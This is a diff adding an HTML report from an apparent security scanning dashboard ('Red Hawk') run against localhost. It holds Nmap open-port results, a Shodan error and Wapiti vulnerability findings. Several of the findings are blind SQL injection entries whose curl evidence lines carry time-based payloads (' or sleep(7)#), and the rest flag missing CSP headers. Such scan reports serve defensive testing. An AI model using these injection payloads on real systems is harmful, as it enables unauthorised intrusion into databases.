@@ -1,0 +1,1571 @@
+
+<!doctype html>
+<html lang="es-es">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+
+  <title>Report</title>
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+
+
+  <style>
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+
+
+  <!-- Custom styles for this template -->
+  <link href="/static/css/dashboard.css" rel="stylesheet">
+</head>
+
+<body>
+
+  <header class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0 shadow">
+    <a class="navbar-brand col-md-3 col-lg-2 me-0 px-3" href="/dashboard/">Red Hawk</a>
+    <ul class="navbar-nav px-3">
+    <li class="nav-item text-nowrap">
+    </li>
+    </ul>
+</header>
+
+  <main class="container-fluid">
+
+    <div class="my-3 p-3 bg-body rounded shadow-sm">
+      <h6 class="border-bottom pb-2 mb-0">Target information</h6>
+      <div class="d-flex text-muted pt-3">
+        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
+          class="bd-placeholder-img flex-shrink-0 me-2 bi bi-person-lines-fill" viewBox="0 0 16 16">
+          <path
+            d="M6 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-5 6s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H1zM11 3.5a.5.5 0 0 1 .5-.5h4a.5.5 0 0 1 0 1h-4a.5.5 0 0 1-.5-.5zm.5 2.5a.5.5 0 0 0 0 1h4a.5.5 0 0 0 0-1h-4zm2 3a.5.5 0 0 0 0 1h2a.5.5 0 0 0 0-1h-2zm0 3a.5.5 0 0 0 0 1h2a.5.5 0 0 0 0-1h-2z" />
+        </svg>
+
+        <p class="pb-3 mb-0 small lh-sm border-bottom">
+          <strong class="d-block text-gray-dark">Domain</strong>
+          localhost
+        </p>
+      </div>
+      <div class="d-flex text-muted pt-3">
+        <svg focusable="false" xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
+          class="bd-placeholder-img flex-shrink-0 me-2 bi bi-globe" viewBox="0 0 16 16">
+          <path
+            d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm7.5-6.923c-.67.204-1.335.82-1.887 1.855A7.97 7.97 0 0 0 5.145 4H7.5V1.077zM4.09 4a9.267 9.267 0 0 1 .64-1.539 6.7 6.7 0 0 1 .597-.933A7.025 7.025 0 0 0 2.255 4H4.09zm-.582 3.5c.03-.877.138-1.718.312-2.5H1.674a6.958 6.958 0 0 0-.656 2.5h2.49zM4.847 5a12.5 12.5 0 0 0-.338 2.5H7.5V5H4.847zM8.5 5v2.5h2.99a12.495 12.495 0 0 0-.337-2.5H8.5zM4.51 8.5a12.5 12.5 0 0 0 .337 2.5H7.5V8.5H4.51zm3.99 0V11h2.653c.187-.765.306-1.608.338-2.5H8.5zM5.145 12c.138.386.295.744.468 1.068.552 1.035 1.218 1.65 1.887 1.855V12H5.145zm.182 2.472a6.696 6.696 0 0 1-.597-.933A9.268 9.268 0 0 1 4.09 12H2.255a7.024 7.024 0 0 0 3.072 2.472zM3.82 11a13.652 13.652 0 0 1-.312-2.5h-2.49c.062.89.291 1.733.656 2.5H3.82zm6.853 3.472A7.024 7.024 0 0 0 13.745 12H11.91a9.27 9.27 0 0 1-.64 1.539 6.688 6.688 0 0 1-.597.933zM8.5 12v2.923c.67-.204 1.335-.82 1.887-1.855.173-.324.33-.682.468-1.068H8.5zm3.68-1h2.146c.365-.767.594-1.61.656-2.5h-2.49a13.65 13.65 0 0 1-.312 2.5zm2.802-3.5a6.959 6.959 0 0 0-.656-2.5H12.18c.174.782.282 1.623.312 2.5h2.49zM11.27 2.461c.247.464.462.98.64 1.539h1.835a7.024 7.024 0 0 0-3.072-2.472c.218.284.418.598.597.933zM10.855 4a7.966 7.966 0 0 0-.468-1.068C9.835 1.897 9.17 1.282 8.5 1.077V4h2.355z" />
+        </svg>
+        <p class="pb-3 mb-0 small lh-sm border-bottom">
+          <strong class="d-block text-gray-dark">IP Address</strong>
+          127.0.0.1
+        </p>
+      </div>
+      <div class="d-flex text-muted pt-3">
+
+        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
+          class="bd-placeholder-img flex-shrink-0 me-2 bi bi-calendar" viewBox="0 0 16 16">
+          <path
+            d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM1 4v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4H1z" />
+        </svg>
+        <p class="pb-3 mb-0 small lh-sm border-bottom">
+          <strong class="d-block text-gray-dark">Date</strong>
+          08/15/2021 11:29 a.m.
+        </p>
+      </div>
+    </div>
+
+    
+<!doctype html>
+<html lang="es-es">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+
+  <title>Reporte</title>
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+
+
+  <style>
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+
+
+  <!-- Custom styles for this template -->
+  <link href="/static/css/dashboard.css" rel="stylesheet">
+</head>
+
+
+
+  <main>
+  
+  
+  <div class="my-3 p-3 bg-body rounded shadow-sm">
+    <h6 class="border-bottom pb-2 mb-0">Nmap</h6>
+    <a href="#Nmap"></a>
+    <p></p>
+    <h6 class="border-bottom pb-2 mb-0">Gathered information</h6>
+    <div class="d-flex text-muted pt-3">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
+        class="bd-placeholder-img flex-shrink-0 me-2 bi bi-info-circle" viewBox="0 0 16 16">
+        <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+        <path
+          d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Nmap done at Sun Aug 15 11:17:14 2021; 1 IP address (1 host up) scanned in 104.34 seconds</strong>
+
+        </div>
+      </div>
+    </div>
+    
+    <p></p>
+
+    <h6 class="border-bottom pb-2 mb-0">Open ports</h6>
+    
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class="bd-placeholder-img flex-shrink-0 me-2 rounded" width="32" height="32"
+        xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Placeholder: 32x32"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <rect width="100%" height="100%" fill="#008000" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">80</strong>
+
+        </div>
+        <span class="d-block">Service: http</span>
+        <span class="d-block">Protocol: tcp</span>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class="bd-placeholder-img flex-shrink-0 me-2 rounded" width="32" height="32"
+        xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Placeholder: 32x32"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <rect width="100%" height="100%" fill="#008000" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">5432</strong>
+
+        </div>
+        <span class="d-block">Service: postgresql</span>
+        <span class="d-block">Protocol: tcp</span>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class="bd-placeholder-img flex-shrink-0 me-2 rounded" width="32" height="32"
+        xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Placeholder: 32x32"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <rect width="100%" height="100%" fill="#008000" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">8000</strong>
+
+        </div>
+        <span class="d-block">Service: http-alt</span>
+        <span class="d-block">Protocol: tcp</span>
+      </div>
+    </div>
+    
+    
+  
+</main>
+
+
+  <script src="/static/js/bootstrap.bundle.min.js"></script>
+
+  <script src="https://unpkg.com/feather-icons"></script>
+  </script>
+  <script src="/static/js/dashboard.js"></script>
+
+</html>
+    
+<!doctype html>
+<html lang="es-es">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+
+  <title>Report</title>
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+
+
+  <style>
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+
+
+  <!-- Custom styles for this template -->
+  <link href="/static/css/dashboard.css" rel="stylesheet">
+</head>
+
+
+
+<main>
+
+  <div class="my-3 p-3 bg-body rounded shadow-sm">
+    <h6 class="border-bottom pb-2 mb-0">Shodan</h6>
+    <a href="#Nmap"></a>
+    <p></p>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
+        class="bd-placeholder-img flex-shrink-0 me-2 bi bi-info-circle" viewBox="0 0 16 16">
+        <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+        <path
+          d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
+      </svg>
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">The host which you are trying to scan is not available in Shodan,
+            your api key is miss configured or you have reached your max api queries.
+          </strong>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+</main>
+
+
+<script src="/static/js/bootstrap.bundle.min.js"></script>
+
+<script src="https://unpkg.com/feather-icons"></script>
+</script>
+<script src="/static/js/dashboard.js"></script>
+
+</html>
+    
+<!doctype html>
+<html lang="es-es">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+
+  <title>Report</title>
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+
+
+  <style>
+    .bd-placeholder-img {
+      font-size: 1.125rem;
+      text-anchor: middle;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      user-select: none;
+    }
+
+    @media (min-width: 768px) {
+      .bd-placeholder-img-lg {
+        font-size: 3.5rem;
+      }
+    }
+  </style>
+
+
+  <!-- Custom styles for this template -->
+  <link href="/static/css/dashboard.css" rel="stylesheet">
+</head>
+
+
+
+<main>
+
+
+  <div class="my-3 p-3 bg-body rounded shadow-sm">
+    <h6 class="border-bottom pb-2 mb-0">Wapiti - Web Application Vulnerability Scanner</h6>
+    <a href="#Wapiti"></a>
+    <p></p>
+    
+
+    <h6 class="border-bottom pb-2 mb-0">Vulnerabilities  (45) 
+    </h6>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Blind SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Blind SQL vulnerability via injection in the parameter number</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql6.php?number=%27+or+sleep%287%29%231&amp;submit=Submit&quot; -e &quot;http://localhost:9991/www/SQL/sql6.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Blind SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Blind SQL vulnerability via injection in the parameter submit1</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/&quot; -e &quot;http://localhost:9991/www/&quot; -d &quot;submit1=sleep%287%29%231&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Blind SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Blind SQL vulnerability via injection in the parameter firstname</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql1.php&quot; -e &quot;http://localhost:9991/www/SQL/sql1.php&quot; -d &quot;firstname=%27+or+sleep%287%29%231&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Blind SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Blind SQL vulnerability via injection in the parameter number</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql2.php&quot; -e &quot;http://localhost:9991/www/SQL/sql2.php&quot; -d &quot;number=sleep%287%29%231&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Blind SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Blind SQL vulnerability via injection in the parameter number</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql3.php&quot; -e &quot;http://localhost:9991/www/SQL/sql3.php&quot; -d &quot;number=%27+or+sleep%287%29%231&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Blind SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Blind SQL vulnerability via injection in the parameter number</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql4.php&quot; -e &quot;http://localhost:9991/www/SQL/sql4.php&quot; -d &quot;number=sleep%287%29%231&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Content Security Policy Configuration</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: CSP is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Content Security Policy Configuration</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: CSP is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Content Security Policy Configuration</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: CSP is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Content Security Policy Configuration</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: CSP is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
